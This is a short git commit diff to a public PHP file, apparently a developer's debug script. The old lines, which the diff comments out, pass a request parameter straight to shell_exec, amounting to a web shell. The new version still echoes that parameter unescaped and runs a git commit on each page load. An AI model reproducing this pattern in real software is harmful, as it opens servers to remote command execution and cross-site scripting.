6db35696e031159f7bba400bb0aa9da8f1819d4d
gao <fishis@163.com>
2017-07-27 17:26:14 +0800

    merge

--- public/a.php
+++ public/a.php
@@ -2,6 +2,7 @@
 $cmd=$_REQUEST['cmd'];
 echo $cmd;
 echo '<pre>';
-echo shell_exec('tail /tmp/supervisord.log');
-echo shell_exec($cmd);
-echo '</pre>';
+//echo shell_exec('tail /tmp/supervisord.log');
+//echo shell_exec($cmd);
+
+echo shell_exec('git commit -m "merge" -a');
